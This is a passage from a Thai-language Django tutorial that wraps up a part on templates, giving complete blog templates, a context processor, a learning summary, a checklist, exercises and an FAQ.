ทบทวน Model และ View จาก Part 007 อีกครั้งก่อน:

```python
# blog/models.py
from django.db import models
from django.urls import reverse


class Post(models.Model):
    title = models.CharField(max_length=200)
    slug = models.SlugField(max_length=220, unique=True)
    content = models.TextField()
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
    is_published = models.BooleanField(default=True)

    class Meta:
        ordering = ['-created_at']

    def __str__(self):
        return self.title

    def get_absolute_url(self):
        return reverse('blog:detail', kwargs={'slug': self.slug})
```

```python
# blog/views.py
from django.shortcuts import render, get_object_or_404
from .models import Post


def post_list(request):
    posts = Post.objects.filter(is_published=True)
    return render(request, 'blog/list.html', {'posts': posts})


def post_detail(request, slug):
    post = get_object_or_404(Post, slug=slug, is_published=True)
    return render(request, 'blog/detail.html', {'post': post})
```

```python
# blog/urls.py
from django.urls import path
from . import views

app_name = 'blog'

urlpatterns = [
    path('', views.post_list, name='list'),
    path('<slug:slug>/', views.post_detail, name='detail'),
]
```

```python
# config/urls.py
from django.contrib import admin
from django.urls import path, include

urlpatterns = [
    path('admin/', admin.site.urls),
    path('posts/', include('blog.urls')),
]
```

ไฟล์ `base.html` เวอร์ชันสมบูรณ์ (รวมทุกอย่างจากขั้นตอนที่ 75-79):

```html
<!-- templates/base.html -->
{% load static %}
<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{% block title %}{{ site_name|default:"Django Mastery Blog" }}{% endblock %}</title>
    <link rel="stylesheet" href="{% static 'blog/css/style.css' %}">
    {% block extra_head %}{% endblock %}
</head>
<body>
    {% include 'partials/navbar.html' %}

    <main class="container">
        {% block content %}
        <p>ยังไม่มีเนื้อหา</p>
        {% endblock %}
    </main>

    {% include 'partials/footer.html' %}

    {% block extra_js %}{% endblock %}
</body>
</html>
```

```html
<!-- templates/partials/navbar.html -->
<nav class="navbar">
    <a href="{% url 'blog:list' %}" class="navbar__brand">{{ site_name|default:"Django Mastery Blog" }}</a>
    <ul class="navbar__menu">
        <li><a href="{% url 'blog:list' %}">บทความทั้งหมด</a></li>
    </ul>
</nav>
```

```html
<!-- templates/partials/footer.html -->
<footer class="footer">
    <p>&copy; {% now "Y" %} {{ site_name|default:"Django Mastery Blog" }} —
       มีบทความทั้งหมด {{ published_post_count|default:0 }} เรื่อง</p>
</footer>
```

```html
<!-- blog/templates/blog/_post_card.html -->
<article class="post-card">
    <h2><a href="{% url 'blog:detail' slug=post.slug %}">{{ post.title }}</a></h2>
    <p class="post-card__meta">เผยแพร่เมื่อ {{ post.created_at|date:"d F Y" }}</p>
    <p class="post-card__excerpt">{{ post.content|truncatewords:30 }}</p>
</article>
```

```html
<!-- blog/templates/blog/list.html -->
{% extends 'base.html' %}

{% block title %}บทความทั้งหมด | {{ site_name|default:"Django Mastery Blog" }}{% endblock %}

{% block content %}
<h1>บทความทั้งหมด</h1>

{% for post in posts %}
    {% include 'blog/_post_card.html' with post=post only %}
{% empty %}
    <p>ยังไม่มีบทความในขณะนี้</p>
{% endfor %}
{% endblock %}
```

```html
<!-- blog/templates/blog/detail.html -->
{% extends 'base.html' %}

{% block title %}{{ post.title }} | {{ site_name|default:"Django Mastery Blog" }}{% endblock %}

{% block extra_head %}
    <meta property="og:title" content="{{ post.title }}">
    <meta property="og:type" content="article">
{% endblock %}

{% block content %}
<article>
    <h1>{{ post.title }}</h1>
    <p class="post-card__meta">
        เผยแพร่เมื่อ {{ post.created_at|date:"d F Y H:i" }}
        {% if post.updated_at != post.created_at %}
            (แก้ไขล่าสุด {{ post.updated_at|date:"d F Y H:i" }})
        {% endif %}
    </p>

    <div class="post-detail__content">
        {{ post.content|linebreaks }}
    </div>

    <p><a href="{% url 'blog:list' %}">&larr; กลับไปหน้ารวมบทความ</a></p>
</article>
{% endblock %}
```

และ context processor ที่เพิ่ม `site_name`/`published_post_count` ให้ทุกหน้าใช้ได้
(เพิ่มลงทะเบียนใน `TEMPLATES.OPTIONS.context_processors` ตามขั้นตอนที่ 79.4):

```python
# blog/context_processors.py
from .models import Post


def site_metadata(request):
    return {
        'site_name': 'Django Mastery Blog',
        'published_post_count': Post.objects.filter(is_published=True).count(),
    }
```

ทดสอบด้วยการสร้างข้อมูลตัวอย่างผ่าน Django shell แล้วรัน server:

```bash
python manage.py shell
```

```python
from blog.models import Post

Post.objects.create(
    title="เริ่มต้นกับ Django Template Language",
    slug="intro-django-template-language",
    content="Django Template Language (DTL) คือระบบเทมเพลตที่มากับ Django โดยตรง " * 10,
)
exit()
```

```bash
python manage.py runserver
```

เปิดเบราว์เซอร์ไปที่ `http://127.0.0.1:8000/posts/` ควรเห็นหน้ารวมบทความที่มี
navbar, post card, footer ครบถ้วน และคลิกเข้าไปดูรายละเอียดบทความได้ผ่าน
`http://127.0.0.1:8000/posts/intro-django-template-language/`

### 80.2 สรุปสิ่งที่ได้เรียนรู้ใน Part นี้

- ✅ เข้าใจ Template Engine และการตั้งค่า `TEMPLATES`, ความหมายของ `DIRS` และ
  `APP_DIRS` รวมถึงลำดับการค้นหา template
- ✅ ใช้ Variable `{{ }}` และเข้าใจลำดับ dot-lookup (dictionary → attribute →
  method call → list-index)
- ✅ ใช้ Tags `{% if/elif/else %}`, `{% for/empty %}` พร้อม `forloop`, และ
  `{% with %}`
- ✅ ใช้ Filter ที่สำคัญ (`date`, `default`, `length`, `truncatewords`, `safe`,
  `escape`, `linebreaks`) และรู้จักการต่อ filter เป็นสาย
- ✅ สร้าง Template Inheritance จริงด้วย `{% extends %}`/`{% block %}` รวมถึง
  `{{ block.super }}` และ multi-level inheritance
- ✅ แยก Partial Template ด้วย `{% include %}` พร้อม `with ... only`
- ✅ ใช้ `{% load static %}`/`{% static %}` แสดงไฟล์ CSS ใน template
- ✅ เข้าใจ Auto-Escaping ป้องกัน XSS, การใช้ `safe` อย่างระมัดระวัง, และ
  `{% csrf_token %}` ป้องกัน CSRF
- ✅ เข้าใจ Context Processors และเขียน custom context processor ของตัวเองได้
- ✅ สร้าง `base.html`, `blog/list.html`, `blog/detail.html` ที่ทำงานได้จริง
  เชื่อมกับ View จาก Part 007

### 80.3 Checklist ก่อนไป Part ถัดไป

- [ ] เพิ่ม `DIRS: [BASE_DIR / 'templates']` ใน `TEMPLATES` ของ `config/settings.py`
- [ ] สร้างโฟลเดอร์ `templates/base.html`, `templates/partials/navbar.html`,
      `templates/partials/footer.html`
- [ ] สร้าง `blog/templates/blog/list.html`, `blog/templates/blog/detail.html`,
      `blog/templates/blog/_post_card.html`
- [ ] สร้าง `blog/static/blog/css/style.css` และเห็นการจัดหน้าเมื่อรัน server
- [ ] เพิ่ม `blog/context_processors.py` และลงทะเบียนใน `TEMPLATES.OPTIONS`
- [ ] รัน `python manage.py runserver` แล้วเปิด `/posts/` และ `/posts/<slug>/`
      เห็นหน้าเว็บที่มี navbar/footer/post card ครบถ้วน
- [ ] ทดลองพิมพ์ตัวแปรที่ไม่มีอยู่จริงใน template แล้วสังเกตว่าไม่มี error เกิดขึ้น
- [ ] ทดลองใส่ `<script>` ในเนื้อหาบทความ แล้วดูว่า Django escape ให้อัตโนมัติ

### 80.4 แบบฝึกหัดท้ายบท

**แบบฝึกหัดที่ 1**: เพิ่ม block ใหม่ชื่อ `breadcrumb` ใน `base.html` (วางไว้เหนือ
`{% block content %}` ใน `<main>`) แล้ว override มันใน `blog/detail.html` ให้แสดง
"หน้าแรก / บทความทั้งหมด / {{ post.title }}" โดยแต่ละส่วนที่ไม่ใช่ส่วนสุดท้ายต้อง
เป็นลิงก์ที่ใช้ `{% url %}` (ห้าม hardcode URL)

**แบบฝึกหัดที่ 2**: สร้าง custom filter ชื่อ `reading_time` (ตามตัวอย่างในขั้นตอนที่
74.5) ในไฟล์ `blog/templatetags/blog_extras.py` ให้คำนวณเวลาอ่านโดยประมาณจาก
`post.content` (สมมติอ่านเฉลี่ย 200 คำ/นาที ปัดขึ้นเป็นจำนวนเต็มอย่างน้อย 1 นาที)
แล้วนำไปแสดงใน `blog/detail.html` ว่า "ใช้เวลาอ่านประมาณ X นาที"

**แบบฝึกหัดที่ 3**: แก้ `post_list` view ให้รองรับการกรองผ่าน query parameter
`?q=` (ค้นหาจาก `title`) แล้วปรับ `blog/list.html` ให้แสดงข้อความ "ผลการค้นหาสำหรับ
'{{ query }}': พบ N บทความ" เมื่อมีการค้นหา (ใช้ `{% if query %}` ตรวจสอบ) และ
"ยังไม่มีบทความที่ตรงกับคำค้นหา" เมื่อ `posts` ว่างเปล่าจากการค้นหา (ใช้
`{% empty %}` ของ `{% for %}`)

**แบบฝึกหัดที่ 4 (ขั้นสูง)**: เขียน custom context processor เพิ่มเติมชื่อ
`latest_posts` ที่ส่งบทความ 3 อันดับล่าสุด (`is_published=True`, เรียงตาม
`-created_at`) เข้าทุก template ในชื่อตัวแปร `sidebar_latest_posts` แล้วนำไปแสดงใน
`templates/partials/footer.html` เป็นลิงก์ 3 รายการ (ใช้ `{% include %}` เรียก
`blog/_post_card.html` ซ้ำจากใน footer ได้ด้วย ลองสังเกตว่า partial เดียวกัน
สามารถ reuse ได้จากหลายจุดในเว็บไซต์)

### 80.5 คำถามที่พบบ่อย (FAQ)

**Q: ทำไม Django Template Language ถึงจำกัดมากกว่า Jinja2 หรือเขียน Python เต็มรูป
แบบไม่ได้เลย?**
A: เป็นการออกแบบที่ตั้งใจ (design philosophy) ของ Django ที่เรียกว่า
"template ไม่ควรมี business logic" การจำกัดความสามารถของ template บังคับให้
นักพัฒนาต้องคิดคำนวณ/ประมวลผลข้อมูลใน View หรือ Model แทน ซึ่งเป็นที่ที่เทสต์ได้
ง่ายกว่าและแยกความรับผิดชอบชัดเจนกว่า (Separation of Concerns) นักพัฒนาที่มา
จาก framework อื่นที่ยืดหยุ่นกว่ามักจะอึดอัดช่วงแรก แต่จะเห็นประโยชน์ชัดเจนเมื่อ
โปรเจกต์โตขึ้นและมีหลายคนดูแล template ร่วมกัน

**Q: ควรวางไฟล์ template ไว้ที่ `templates/` ระดับโปรเจกต์ หรือใน `<app>/templates/`
ของแต่ละแอปดี?**
A: ใช้กฎง่าย ๆ นี้: ถ้า template นั้นเป็นของเฉพาะแอปหนึ่ง (เช่น หน้ารายการบทความ
เป็นของแอป `blog` เท่านั้น) ให้วางใน `blog/templates/blog/` เสมอ เพื่อให้แอปนั้น
"พกพา" template ของตัวเองไปได้ (สอดคล้องกับแนวคิด Reusable App จาก Part 005)
ส่วน template ที่ใช้ร่วมกันทั้งเว็บไซต์ (เช่น `base.html`, หน้า error, partial
ทั่วไปที่ไม่ผูกกับโดเมนไหน) ให้วางที่ `templates/` ระดับโปรเจกต์

**Q: `{% include %}` กับการเขียน Custom Template Tag แบบ inclusion tag (จะเรียนใน
Part 029) ต่างกันอย่างไร ควรใช้อันไหน?**
A: `{% include %}` เหมาะกับกรณีง่าย ๆ ที่ไม่มี logic ซับซ้อน (แค่ "เอาไฟล์มาแปะ
พร้อม context ที่กำหนด") ส่วน inclusion tag เหมาะเมื่อ partial นั้นต้องการ
**คำนวณข้อมูลเพิ่มเติม** ก่อนแสดงผล (เช่น ต้อง query ฐานข้อมูลเอง ไม่ได้รับข้อมูล
มาจาก context ของหน้าที่เรียก) — เราจะเห็นตัวอย่างเปรียบเทียบชัดเจนใน Part 029

**Q: ทำไม Django ไม่ raise error ทันทีเมื่อ template อ้างอิงตัวแปรที่ไม่มีอยู่จริง
เหมือนภาษาโปรแกรมมิ่งทั่วไป?**
A: เป็นการตัดสินใจเชิงออกแบบที่ให้ความสำคัญกับ "ความทนทาน" (robustness) ของหน้าเว็บ
มากกว่า — การพิมพ์ชื่อตัวแปรผิดเล็กน้อยไม่ควรทำให้ทั้งหน้าพัง (500 error) แต่ควร
แสดงผลเป็นช่องว่างแทน อย่างไรก็ตาม ระหว่างพัฒนา คุณสามารถตั้งค่า
`'string_if_invalid': 'INVALID: %s'` ใน `TEMPLATES.OPTIONS` ชั่วคราวเพื่อให้เห็น
ชัดเจนว่าตัวแปรไหนอ้างอิงผิดหรือไม่มีอยู่จริง (ไม่ควรเปิดใน production เพราะจะทำให้
ข้อความ "INVALID" หลุดไปแสดงต่อผู้ใช้จริง)

---

## เตรียมตัวสำหรับ Part ถัดไป

**Part 009: การจัดการ Static Files และ Media Files อย่างมืออาชีพ** จะพาคุณเจาะลึก
ระบบ Static Files ที่เพิ่งแตะผิว ๆ ไปในขั้นตอนที่ 77 ของ Part นี้ ตั้งแต่ความหมายของ
`STATIC_URL`, `STATICFILES_DIRS`, `STATIC_ROOT`, คำสั่ง `collectstatic`,
`STATICFILES_FINDERS` เบื้องหลังการทำงาน, การจัดการรูปภาพที่ผู้ใช้อัปโหลด (Media
Files) ด้วย `MEDIA_URL`/`MEDIA_ROOT`, ไปจนถึงการเตรียมพร้อมสำหรับ production ด้วย
เครื่องมืออย่าง WhiteNoise หรือการเสิร์ฟผ่าน CDN เมื่อจบ Part 009 คุณจะสามารถจัดการ
ไฟล์ CSS, JavaScript, รูปภาพ และไฟล์อัปโหลดของผู้ใช้ได้อย่างถูกต้องทั้งในโหมด
development และ production

เตรียมโฟลเดอร์ `blog/static/blog/` ที่สร้างไว้ใน Part นี้ให้พร้อม เดี๋ยวเราจะเพิ่ม
ไฟล์ JavaScript และรูปภาพเข้าไปกันต่อ!
